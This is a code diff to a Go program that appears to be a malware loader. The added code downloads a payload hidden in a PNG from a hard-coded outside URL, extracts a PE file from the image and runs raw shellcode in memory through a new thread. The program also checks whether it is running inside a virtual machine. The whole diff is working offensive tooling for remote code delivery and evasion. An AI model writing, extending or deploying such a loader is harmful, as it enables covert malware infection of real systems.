@@ -3,8 +3,10 @@ package main
 import (
 	"flag"
 	"fmt"
+	"gohttpmem/pkg/extractor"
 	"gohttpmem/pkg/gorundll"
 	"gohttpmem/pkg/gorunpe"
+	"gohttpmem/pkg/runshellthread"
 	"gohttpmem/pkg/vm"
 	"io"
 	"net/http"
@@ -17,8 +19,39 @@ import (
 
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
-	defaultDownloadURL = ""
+	defaultDownloadURL = "https://l.station307.com/K3A1jN2qutfzSTEzHwrqQN/pice3x3.png"
+
+	// Expected first 16 bytes of the shellcode from payload3x3.bin
+	expectedShellcodePrefix = "E8807523008075230066 07DFC81E0EC4"
 )
+
+// verifyShellcodePrefix checks if the first 16 bytes of the shellcode match the expected pattern
+func verifyShellcodePrefix(shellcode []byte) bool {
+	if len(shellcode) < 16 {
+		return false
+	}
+	
+	// Format the first 16 bytes of the shellcode as a hex string
+	actualHex := formatBytesAsHex(shellcode[:16])
+	
+	// Remove spaces from expected hex string for comparison
+	expectedNoSpaces := strings.ReplaceAll(expectedShellcodePrefix, " ", "")
+	actualNoSpaces := strings.ReplaceAll(actualHex, " ", "")
+	
+	return strings.EqualFold(expectedNoSpaces, actualNoSpaces)
+}
+
+// formatBytesAsHex formats a byte slice as a hex string
+func formatBytesAsHex(data []byte) string {
+	var result strings.Builder
+	for i, b := range data {
+		result.WriteString(fmt.Sprintf("%02X", b))
+		if i < len(data)-1 {
+			result.WriteString(" ")
+		}
+	}
+	return result.String()
+}
 
 func main() {
 	// check if inside vm
@@ -36,6 +69,8 @@ func main() {
 	isDllPtr := flag.Bool("dll", false, "Specifies whether the payload is a DLL (default: false, treats payload as EXE)")
 	procNamePtr := flag.String("proc", "", "For DLLs: Name of the exported procedure to call (optional)")
 	ordinalPtr := flag.Int("ordinal", -1, "For DLLs: Ordinal of the exported procedure to call (optional, takes precedence over -proc)")
+	isImagePtr := flag.Bool("image", false, "Specifies whether the payload is embedded in an image file (PNG)")
+	isShellcodePtr := flag.Bool("shellcode", false, "Specifies whether the payload is raw shellcode")
 	flag.Parse()
 
 	// Get URL from remaining args
@@ -62,9 +97,9 @@ func main() {
 
 	// http client to download the payload
 	client := &http.Client{
-		Timeout: 30 * time.Second,
+		Timeout: 60 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			if len(via) >= 10 {
+			if len(via) >= 30 {
 				return http.ErrUseLastResponse
 			}
 			return nil
@@ -98,8 +133,51 @@ func main() {
 		return
 	}
 
-	if len(payload) < 512 {
-		fmt.Println("Error: Payload too small to be a valid PE file")
+	// If payload is embedded in an image, extract it
+	if *isImagePtr {
+		fmt.Println("Extracting payload from image...")
+		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
+		if err != nil {
+			fmt.Println("Error extracting payload from image:", err)
+			return
+		}
+		payload = extractedPayload
+		fmt.Printf("Successfully extracted %d bytes from image\n", len(payload))
+	}
+
+	// For shellcode, execute directly using runshellthread
+	if *isShellcodePtr {
+		fmt.Println("Executing payload as shellcode...")
+		
+		// Verify shellcode matches expected bytes
+		if verifyShellcodePrefix(payload) {
+			fmt.Println(" Shellcode verification passed: First 16 bytes match expected pattern")
+		} else {
+			fmt.Println(" Shellcode verification failed: First 16 bytes do not match expected pattern")
+			fmt.Println("Expected: " + expectedShellcodePrefix)
+			actualHex := formatBytesAsHex(payload[:16])
+			fmt.Println("Actual:   " + actualHex)
+			fmt.Println("Continuing execution anyway...")
+		}
+		
+		threadHandle, err := runshellthread.ExecuteShellcode(payload, true)
+		if err != nil {
+			fmt.Println("Error executing shellcode:", err)
+			return
+		}
+		fmt.Printf("Shellcode thread created with handle: 0x%x\n", threadHandle)
+		
+		// Give the shellcode some time to start executing before prompting
+		fmt.Println("Waiting for shellcode to initialize (5 seconds)...")
+		time.Sleep(5 * time.Second)
+		
+		fmt.Println("Shellcode is running. Press Enter to exit...")
+		
+		// Keep the main process alive
+		// This allows the shellcode to continue running even if it doesn't signal completion
+		fmt.Scanln() // Wait for user input before exiting
+		
+		// Cleanup
 		return
 	}
 
